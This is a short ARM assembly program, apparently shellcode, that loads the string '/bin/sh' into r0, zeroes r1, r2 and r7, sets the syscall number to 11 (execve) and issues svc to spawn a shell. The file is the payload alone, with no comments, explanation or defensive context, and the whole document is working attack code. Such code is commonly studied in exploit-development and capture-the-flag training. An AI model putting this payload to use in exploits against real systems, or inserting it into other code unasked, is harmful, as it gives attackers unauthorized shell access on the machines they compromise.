.section .text
.globl _start
_start:
	ldr   r4, =shell
	stmdb sp!, {r4, r7, pc}
	ldmia sp!, {r0, r1, r2}
	eor   r1, r1, r1
	eor   r2, r2, r2
	eor   r7, r7, r7
	mov   r7, #11
	svc   #0

shell:
	.asciz "/bin/sh"
